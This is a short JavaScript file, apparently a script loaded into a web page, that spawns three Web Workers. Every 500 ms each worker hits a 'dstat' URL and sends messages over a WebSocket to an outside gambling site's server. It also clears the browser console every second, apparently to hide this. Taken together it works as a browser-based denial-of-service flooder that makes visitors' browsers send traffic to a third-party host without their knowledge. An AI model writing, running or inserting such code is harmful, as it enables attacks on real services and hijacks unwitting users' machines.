




const workerCode = `

setInterval(async function () {
        await fetch('https://layer7.wiki/dstat/');
}, 500);
  let socket = null;
  let interval = null;

  onmessage = function(e) {
    const index = e.data.index ?? 0;
    const url = 'wss://cp-ws.casinoplus.top/websocket';

    socket = new WebSocket(url);

    socket.onopen = function() {
      console.log('Worker ' + index + ' connected');

      interval = setInterval(() => {
        if (socket.readyState === WebSocket.OPEN) {
          socket.send(JSON.stringify({ test: 1 }));
        }
      }, 500);
    };

    socket.onerror = function(err) {
      console.error('Worker ' + index + ' WebSocket error:', err);
    };

    socket.onclose = function() {
      console.warn('Worker ' + index + ' WebSocket closed');
      clearInterval(interval);
    };

    socket.onmessage = function(event) {

    };
  };
`;

const blob = new Blob([workerCode], { type: 'application/javascript' });
const workerUrl = URL.createObjectURL(blob);

for (let i = 0; i < 3; i++) {
  const worker = new Worker(workerUrl);
  worker.postMessage({ index: i });
}

setInterval(() => {
  console.clear()
  console.log('console cleared by v1.js')
}, 1000);